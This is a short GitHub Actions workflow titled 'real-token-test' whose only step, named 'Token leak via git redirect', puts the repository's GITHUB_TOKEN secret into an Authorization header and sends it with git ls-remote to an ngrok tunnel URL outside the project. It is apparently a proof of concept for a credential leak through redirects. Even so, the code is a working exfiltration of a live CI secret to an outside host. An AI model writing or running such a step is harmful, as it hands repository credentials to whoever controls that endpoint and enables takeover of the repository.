name: real-token-test
on: workflow_dispatch
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Token leak via git redirect
        env:
          GH_TOK: ${{ secrets.GITHUB_TOKEN }}
        run: |
          git -c http.extraHeader="Authorization: token $GH_TOK" ls-remote https://8b0b-105-101-85-53.ngrok-free.app/import-redirect 2>&1 || true
